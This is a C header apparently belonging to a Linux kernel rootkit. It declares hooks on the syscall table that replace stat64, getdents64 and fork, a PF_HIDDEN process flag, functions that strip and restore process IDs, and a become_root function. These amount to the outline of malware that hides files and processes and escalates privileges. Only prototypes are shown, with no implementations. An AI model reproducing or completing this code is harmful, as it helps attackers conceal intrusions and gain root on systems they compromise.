#ifndef HOOKCALLS_H
#define HOOKCALLS_H

#include "includes.h"

#include <linux/fs.h>
#include <linux/file.h>
#include <linux/proc_fs.h>

#define PF_HIDDEN	128

extern void *sys_call_table[];

long (*o_stat64)(const char *, struct stat64 *);
long (*o_getdents64)(unsigned int, void *, unsigned int);
int  (*o_fork)(struct pt_regs);

void init_syscalls();
void restore_syscalls();

long m_stat64(const char *, struct stat64 *);

void become_root(struct task_struct *);

long m_getdents64(unsigned int, void *, unsigned int);

void strip_pids();
void unstrip_pids();

int m_fork(struct pt_regs);

#endif
